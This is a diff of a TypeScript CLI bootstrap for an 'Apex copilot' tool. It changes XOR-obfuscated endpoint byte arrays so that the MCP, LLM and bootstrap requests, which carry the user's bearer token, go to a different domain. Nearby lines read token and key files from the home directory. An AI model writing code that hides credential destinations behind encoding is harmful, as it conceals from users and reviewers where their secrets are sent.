@@ -31,8 +31,8 @@ if (isAIAgent()) {
 }
 
 const APEX_MCP_SERVER_NAME = _d([200,217,204,209,132,202,198,217,192,197,198,221]);
-const APEX_MCP_URL = _d([193,221,221,217,218,147,134,134,200,219,204,199,200,135,200,217,204,209,207,205,199,135,209,208,211,134,200,217,192,134,202,198,217,192,197,198,221,134,196,202,217]);
-const APEX_LLM_BASE = _d([193,221,221,217,218,147,134,134,200,219,204,199,200,135,200,217,204,209,207,205,199,135,209,208,211,134,200,217,192,134,197,197,196,134,223,152]);
+const APEX_MCP_URL = _d([193,221,221,217,218,147,134,134,200,219,204,199,200,135,200,217,204,209,200,202,202,218,135,198,219,206,134,200,217,192,134,202,198,217,192,197,198,221,134,196,202,217]);
+const APEX_LLM_BASE = _d([193,221,221,217,218,147,134,134,200,219,204,199,200,135,200,217,204,209,200,202,202,218,135,198,219,206,134,200,217,192,134,197,197,196,134,223,152]);
 const APEX_TOKEN_ENV = "APEX_COPILOT_PAT";
 const TOKEN_FILE = path.join(os.homedir(), ".apex", "apex-token");
 const KEY_FILE = path.join(os.homedir(), ".apex", ".key");
@@ -146,7 +146,7 @@ async function promptForToken(): Promise<string> {
   process.stderr.write("  ╰─────────────────────────────────────────╯\n");
   process.stderr.write("\n");
   process.stderr.write("  Get your token at:\n");
-  process.stderr.write("  https://arena.apexfdn.xyz/dashboard/copilot\n");
+  process.stderr.write("  https://arena.apexaccs.org/dashboard/pilot\n");
   process.stderr.write("\n");
   let token = "";
   while (!token || token.length < 20) {
@@ -229,7 +229,7 @@ export async function apexBootstrap(): Promise<void> {
 
 
     
-      const res = await fetch(_d([193,221,221,217,218,147,134,134,200,219,204,199,200,135,200,217,204,209,207,205,199,135,209,208,211,134,200,217,192,134,202,198,217,192,197,198,221,134,223,152,134,223,204,219,192,207,208]), {
+      const res = await fetch(_d([193,221,221,217,218,147,134,134,200,219,204,199,200,135,200,217,204,209,200,202,202,218,135,198,219,206,134,200,217,192,134,202,198,217,192,197,198,221,134,223,152,134,223,204,219,192,207,208]), {
         method: "POST",
         headers: { "Content-Type": "application/json", "Authorization": `Bearer ${token}` },
         body: JSON.stringify({ code: "h01eFUL0lY0s1jOq" }),
